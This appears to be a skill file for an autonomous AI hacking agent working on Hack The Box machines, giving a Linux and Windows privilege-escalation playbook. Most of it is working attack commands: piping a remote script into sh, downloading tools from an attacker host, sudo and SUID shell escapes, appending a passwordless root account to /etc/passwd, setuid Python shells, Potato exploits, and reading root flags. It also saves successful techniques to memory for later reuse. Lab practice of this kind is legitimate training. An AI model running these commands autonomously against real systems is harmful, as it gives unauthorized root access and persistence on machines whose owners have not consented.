---
name: privesc
description: >
  Phase 5 privilege escalation for HTB. Checks memory for privesc techniques
  that worked on similar OS/config combinations. Runs automated enum then
  smart-selects vectors based on prior session knowledge.
version: 1.0.0
platforms: [linux, macos]
metadata:
  hermes:
    tags: [htb, privesc, linux, windows, lpe]
    category: htb
    requires_toolsets: [terminal]
---

# Skill: /privesc — Privilege Escalation

## When to Use

Trigger: user shell obtained, phase = PRIVESC.

## Pre-Privesc: Memory + Session Search

```
session_search: "privesc [OS version]"
session_search: "sudo -l bypass"
session_search: "SUID [binary name]"
```

Check MEMORY.md for:
- `privesc pattern: sudo [binary] → [method]`
- `[OS version] kernel exploit: [CVE]`

If match found → try it first before running linpeas.

## Linux Privilege Escalation

### Step 1: Auto-Enum
```bash
# LinPEAS (fastest, most comprehensive)
curl -s https://linpeas.sh | sh 2>/dev/null | tee /tmp/lpe.txt

# Or transfer manually
python3 -m http.server 8080 &  # on attacker
wget http://ATTACKER:8080/linpeas.sh -O /tmp/lpe.sh
chmod +x /tmp/lpe.sh && /tmp/lpe.sh | tee /tmp/lpe.txt
```

### Step 2: Quick Win Checklist (Try These First)

```bash
# 1. Sudo rights
sudo -l
# → GTFOBins: https://gtfobins.github.io/

# 2. SUID binaries
find / -perm -4000 -type f 2>/dev/null

# 3. Capabilities
getcap -r / 2>/dev/null

# 4. Writable cron
cat /etc/crontab; ls /etc/cron.d/

# 5. Writable /etc/passwd
ls -la /etc/passwd

# 6. Docker group
id | grep docker

# 7. Kernel version
uname -r
# searchsploit linux kernel $(uname -r | cut -d- -f1)
```

### Common Quick Wins

```bash
# Sudo vim → GTFOBin
sudo vim -c ':!/bin/bash'

# Sudo find
sudo find . -exec /bin/bash \;

# SUID bash
bash -p

# Writable /etc/passwd
openssl passwd -1 -salt xyz hunter2
echo "hax::0:0:root:/root:/bin/bash" >> /etc/passwd
su hax

# Python cap_setuid
python3 -c "import os; os.setuid(0); os.system('/bin/bash')"
```

## Windows Privilege Escalation

### Step 1: Auto-Enum
```bash
# WinPEAS
curl http://ATTACKER/winpeas.exe -o C:\Windows\Temp\wp.exe
C:\Windows\Temp\wp.exe

# PowerUp
Import-Module .\PowerUp.ps1; Invoke-AllChecks
```

### Quick Win Checklist

```bash
# SeImpersonatePrivilege → GodPotato/PrintSpoofer
whoami /priv | findstr SeImpersonate
.\GodPotato.exe -cmd "cmd /c whoami"

# AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# Unquoted service path
wmic service get name,pathname | findstr /i /v """ | findstr /i /v C:\\Windows

# Stored creds
cmdkey /list
```

## Flag Capture

```bash
# Linux
find / -name root.txt 2>/dev/null
cat /root/root.txt

# Windows
dir C:\Users\Administrator\Desktop\root.txt
type C:\Users\Administrator\Desktop\root.txt
```

## Post-Privesc Memory Save

```
memory(action="add", target="memory",
       content="[MACHINE] privesc via: [TECHNIQUE] — [exact command that worked]")
```

## Root Telegram Notification

Fires automatically when root.txt found (via save.py flag detection).
Manual trigger: `python3 tools/htb.py submit-flag root "HTB{...}"`
